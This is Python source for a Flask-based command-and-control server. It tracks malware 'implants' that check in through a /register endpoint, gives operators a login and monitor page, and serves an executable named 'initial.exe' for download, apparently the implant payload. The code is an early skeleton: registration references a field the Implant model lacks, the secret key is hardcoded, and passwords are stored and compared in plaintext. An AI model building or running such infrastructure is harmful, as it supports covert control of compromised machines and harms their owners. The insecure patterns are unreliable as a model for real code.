import flask
from flask import Flask, Response, request, render_template, redirect, send_from_directory, url_for
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import flask_login
import base64

app = Flask(__name__)
app.secret_key = '6AC6663F6BCFEB4191481AC41972DBEE4BDF6E7AA43E74F7E64C5F07DE69CE02'

##############
#  Database  #
##############
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# Schema definitions
class Implant(db.Model):
	id = db.Column(db.Integer, primary_key=True)
	creation_date = db.Column(db.DateTime, nullable=False, default=datetime.utcnow)

class Operator(flask_login.UserMixin, db.Model):
	id = db.Column(db.Integer, primary_key=True)
	username = db.Column(db.String, nullable=False, unique=True)
	password = db.Column(db.String, nullable=False)

###################
#  Login Manager  #
###################
login_manager = flask_login.LoginManager()
login_manager.init_app(app)

@login_manager.unauthorized_handler
def unauthorized_handler():
	return render_template('unauth.html')

@login_manager.user_loader
def load_user(oid):
    return Operator.query.get(oid)

##############
#	Routes	 #
##############

# Login route
@app.route('/', methods=['GET', 'POST'])
def login():
	# GET request
	if flask.request.method == 'GET':
		return render_template('login.html')
	# POST request
	username = flask.request.form['username']
	password = flask.request.form['password']
	operator = Operator.query.filter_by(username=username, password=password).first()
	if operator != None:
		# Valid login
		flask_login.login_user(operator, remember=True)
		return redirect('/monitor')
	# Invalid login
	return render_template('unauth.html')

@app.route('/monitor')
@flask_login.login_required
def monitor():
	return render_template('monitor.html')

@app.route('/register', methods=['POST'])
def register():
	# TODO: Needs error checking, return a proper response
	# Get implant id (iid)
	iid = request.json['gid']
	# Save to database
	new_implant = Implant(iid=iid)
	db.session.add(new_implant)
	db.session.commit()
	return 'Registered'

@app.route('/initial', methods=['GET'])
def download_implant():
	return send_from_directory(directory=app.root_path, filename='initial.exe')

if __name__ == "__main__":
	app.run(port=5000, debug=True)
